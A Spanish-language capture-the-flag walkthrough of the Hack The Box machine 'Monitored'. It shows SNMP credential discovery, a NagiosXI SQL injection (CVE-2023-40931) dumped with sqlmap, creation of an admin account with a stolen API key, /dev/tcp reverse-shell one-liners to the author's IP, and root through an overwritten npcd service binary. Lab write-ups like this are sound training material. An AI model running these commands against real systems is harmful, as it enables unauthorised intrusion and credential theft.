---
description: https://app.hackthebox.com/machines/Monitored
---

# 🟨 HTB - Monitored

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

### **Enumeration**

**Establecer el objetivo**

Primero, establecemos el objetivo utilizando el comando settarget con la dirección IP de la máquina objetivo:

```bash
settarget 10.10.11.248 Monitored
```

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

\
**Ping de reconocimiento**

Realizamos un ping a la máquina objetivo para verificar la conectividad y obtener información sobre la ruta utilizando la opción -R para incluir la ruta de retorno:

```bash
ping -c 1 10.10.11.248 -R
```

<figure><img src="../../.gitbook/assets/image (134).png" alt=""><figcaption></figcaption></figure>

**Escaneo de puertos con Nmap**

Luego, realizamos un escaneo de puertos utilizando Nmap para identificar los puertos abiertos en la máquina objetivo. Utilizamos las opciones -p- para escanear todos los puertos, --open para mostrar solo los puertos abiertos, -sS para un escaneo de tipo TCP SYN, --min-rate 5000 para establecer la velocidad mínima de paquetes y -vvv para un nivel de verbosidad alto. Además, utilizamos -n para desactivar la resolución de DNS, -Pn para no realizar el escaneo de ping, y -oG allPorts para guardar la salida en un archivo con formato Greppable:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv  -n -Pn 10.10.11.248 -oG allPorts
```

Posteriormente, realizamos un escaneo más detallado de los puertos identificados utilizando la opción -sCV para detección de versiones y scripts de enumeración de servicios. Específicamente, indicamos los puertos a escanear con -p \_\_PORTS\_\_ (reemplazando \_\_PORTS\_\_ con los puertos identificados en el paso anterior) y guardamos la salida en un archivo de texto con el nombre targeted:

```bash
sudo nmap -sCV -p22,80,389,443,5667 10.10.11.248 -oN targeted
```

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

Para añadir la entrada "10.10.11.248 nagios.monitored.htb" al archivo /etc/hosts, puedes usar el siguiente comando en la terminal:

```bash
echo "10.10.11.248 nagios.monitored.htb" | sudo tee -a /etc/hosts
```

Este comando añade la dirección IP 10.10.11.245 asociada al nombre de host nagios.monitored.htb al archivo /etc/hosts de tu sistema.

#### Utilizando WhatWeb para Obtener Información sobre el Objetivo

Para obtener más información sobre nuestro objetivo, utilizamos la herramienta WhatWeb. Esta herramienta nos permite identificar tecnologías web utilizadas en el servidor, como el sistema de gestión de contenidos (CMS), el lenguaje de programación, los plugins y otras características. Ejecutamos el siguiente comando:

```bash
whatweb http://nagios.monitored.htb > whatweb && cat whatweb -l java
```

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

### SNMP Enumeration con SNMPWalk&#x20;

En la fase de enumeración de SNMP (Simple Network Management Protocol) utilizando SNMPWalk, se realiza un escaneo de la red en busca de información sobre dispositivos y sistemas. En este caso, se ejecutó el comando `snmpwalk -v2c -c public 10.10.11.248` para buscar información sobre el sistema remoto. Luego, se utilizó el comando `snmpwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.25.4.2.1.5` para obtener información específica sobre los procesos en ejecución en el sistema.

La herramienta utilizada, SNMPWalk, recopila información utilizando el protocolo SNMP, que es comúnmente utilizado para gestionar dispositivos de red. En este caso, se identificaron las credenciales `svc` y `XjH7VCehowpR1xZB` relacionadas con algún servicio o proceso en el sistema remoto. Estas credenciales podrían ser útiles para posteriores fases de penetración en el sistema.

{% code overflow="wrap" %}
```bash
snmpwalk -v2c -c public 10.10.11.248
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

```bash
snmpwalk -v2c -c public 10.10.11.248 1.3.6.1.2.1.25.4.2.1.5
```

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

```
svc:XjH7VCehowpR1xZB
```

Para más detalles sobre el funcionamiento de SNMP y cómo realizar una enumeración efectiva, se puede consultar la guía proporcionada en el enlace [https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp), así como la referencia de los Object Identifiers (OIDs) utilizados en [https://oidref.com/1.3.6.1.2.1.25.4.2.1.5](https://oidref.com/1.3.6.1.2.1.25.4.2.1.5).

***

### Descubrimiento de directorios

\
En la fase de descubrimiento de directorios, se utilizan herramientas como WFuzz y Dirsearch para identificar posibles puntos de entrada o recursos ocultos en el sitio web objetivo. En este caso, se ejecutó un fuzzing con WFuzz en el directorio `/nagiosxi/` para obtener más información sobre el objetivo.

El comando utilizado fue :

{% code overflow="wrap" %}
```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"
```
{% endcode %}

&#x20;Donde se especificó el archivo de lista de palabras `/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt` para realizar el fuzzing en la URL proporcionada `$URL`. Este comando busca archivos y directorios comunes en el sitio web objetivo y muestra las respuestas que no sean código de estado 404 (not found).

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Posteriormente, se utilizó Dirsearch con el comando:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>dirsearch -u https://nagios.monitored.htb/nagiosxi -e php,js,html,txt,bak,zip
</strong></code></pre>

&#x20;Para identificar directorios y archivos que puedan contener información útil. En este caso, se encontraron los directorios `/api/` y `/api/v1/`, los cuales podrían ser puntos de entrada adicionales para investigar más a fondo.

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

\
En la fase de búsqueda de directorios dentro de `/v1/`, se utilizó Dirsearch con el comando&#x20;

{% code overflow="wrap" %}
```basic
dirsearch -u https://nagios.monitored.htb/nagiosxi/api/v1/ -w /endpoints.txt
```
{% endcode %}

&#x20;para identificar posibles puntos de entrada adicionales. En este caso, se encontró el directorio `/authenticate/` dentro de `/v1/`, el cual puede ser un endpoint de autenticación de la API.

Utilizamos este wordlist especial para API endpoints: [https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d](https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d)

Este hallazgo podría ser crucial para avanzar en la penetración del sistema, ya que el endpoint `/authenticate/` podría permitir la autenticación en la API y el acceso a funciones adicionales. Es importante analizar este endpoint con más detalle para determinar cómo se puede utilizar de manera segura y efectiva en el contexto del pentesting.

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

## Obteniendo auth\_token a través del endpoint /authenticate/

Se utilizó la siguiente solicitud Curl para enviar las credenciales de autenticación al endpoint:

{% code overflow="wrap" %}
```bash
curl -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -L -d 'username=svc&password=XjH7VCehowpR1xZB'
```
{% endcode %}

* `-X POST`: Especifica que se realizará una solicitud POST.
* `-k`: Permite realizar la solicitud a un servidor con un certificado SSL no válido.
* `-L`: Sigue las redirecciones si la respuesta es un código de estado 3xx.
* `-d 'username=svc&password=XjH7VCehowpR1xZB'`: Envía los parámetros de usuario y contraseña en el cuerpo de la solicitud.

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

Gracias a las credenciales podemos obtener nuestro token que será crucial más adelante.

## CVE-2023-40931 - Vulnerabilidad en NagiosXI

Al realizar una búsqueda en Internet, encontré información sobre una vulnerabilidad conocida como CVE-2023-40931 que afecta a NagiosXI. Esta vulnerabilidad se puede explotar enviando una solicitud POST a `/nagiosxi/admin/banner_message-ajaxhelper.php` con los parámetros `action=acknowledge_banner_message&id=3&token=*******`.

[https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567)

### Intentamos explotar usando sqlmap

{% code overflow="wrap" %}
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=edb86549b9efd8635a672ed52daa56a26e00118" -p id

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Demostrando ser vulnerable por lo que procedemos a investigar...

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=" -p id -level=5 -risk=3 -D nagiosxi -tables

```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&#x26;id=3&#x26;token=" -p id -level=5 -risk=3 -D nagiosxi -T xi_users -dump
</strong>
</code></pre>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

### Creación de usuario mediante api\_key robada

Se consultó la documentación oficial de NagiosXI para aprender a crear un usuario a través de la API utilizando la api\_key. Se encontró un ejemplo en un post del foro de soporte de Nagios que mostraba cómo hacerlo.

Se utilizó la herramienta Curl para enviar una solicitud POST al endpoint `api/v1/system/user` con los parámetros necesarios para crear un nuevo usuario. Se incluyeron los parámetros `username`, `password`, `name`, `email`, y `auth_level=admin` para crear un usuario con privilegios de administrador.

{% code overflow="wrap" %}
```bash
curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=endglory&password=endglory&name=endglory&email=endglory@monitored.htb&auth_level=admin"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

## Ejecución de Reverse Shell en NagiosXI

Mientras exploraba el panel de NagiosXI, descubrí una página interesante en la ruta `https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php`, donde es posible agregar un comando personalizado. Aprovechando esta funcionalidad, decidí intentar colar un reverse shell en el sistema.

### Agregar un Comando Personalizado

Accedí a la página mencionada y colé mi reverse shell en el campo de comando. Utilicé el siguiente comando para establecer una conexión de reverse shell con mi máquina:

```bash
bash -i >& /dev/tcp/10.10.15.2/6666 0>&1
```

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

### Crear un Servicio para Ejecutar el Comando

Después de agregar el comando, me dirigí a la sección de servicios en NagiosXI y creé un nuevo servicio. En la configuración del servicio, establecí que se ejecute el comando personalizado que acababa de agregar.

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

### Escuchando la conexión de Reverse Shell

Finalmente, inicié Netcat en mi máquina local para escuchar la conexión de reverse shell en el puerto especificado. Una vez que el servicio se ejecutó en el sistema remoto, logré obtener acceso a la máquina a través de la conexión de reverse shell y obteniendo la primera flag user.txt :clap:

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Recuerda que puedes mejorar el UX de la shell con los siguientes tips:

{% content-ref url="../../others/shell-stability.md" %}
[shell-stability.md](../../others/shell-stability.md)
{% endcontent-ref %}





### Subimos y utilizamos LinEnum

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Descargo desde mi máquina (a través de un servidor Python)  LinEnum.sh y le doy permisos de ejecución (chmod +x).

{% content-ref url="../../others/python-server.md" %}
[python-server.md](../../others/python-server.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Al utilizar LinEnum, descubrimos que algunos archivos en la carpeta `/usr/local/nagiosxi/scripts/` se ejecutan con permisos de root sin contraseña. Investigando más a fondo, encontramos que el archivo `manage_services.sh` tiene un CVE que nos permite escalar privilegios.

El archivo `manage_services.sh` se utiliza para iniciar, detener y ver el estado de los servicios que se ejecutan en el sistema. Aparentemente, se ejecuta con privilegios de root y no solicita contraseña, lo que nos permite ejecutar comandos con privilegios elevados.

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p><a href="https://blog.grimm-co.com/2021/11/escalating-xss-to-sainthood-with-nagios.html">https://blog.grimm-co.com/2021/11/escalating-xss-to-sainthood-with-nagios.html</a></p></figcaption></figure>

**Detener el Servicio NPCD**: Utilizaremos `manage_services.sh` para detener el servicio NPCD, que es uno de los servicios que se ejecutan con permisos de root.

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**Eliminar el Ejecutable NPCD**: Eliminaremos el ejecutable del servicio NPCD y crearemos un nuevo archivo con un reverse shell que nos permitirá obtener una shell interactiva en nuestra máquina.

**Reiniciar el Servicio NPCD**: Utilizaremos `manage_services.sh` para reiniciar el servicio NPCD, lo que ejecutará nuestro reverse shell como root.

```bash
rm /usr/local/nagios/bin/npcd
touch /usr/local/nagios/bin/npcd
chmod +x /usr/local/nagios/bin/npcd
echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.2/7777 0>&1'" >> /usr/local/nagios/bin/npcd
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
```

Al ejecutar estos comandos, detendremos el servicio NPCD, crearemos un nuevo archivo NPCD con un reverse shell y reiniciaremos el servicio NPCD, lo que ejecutará nuestro reverse shell como root, dándonos acceso completo al sistema.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
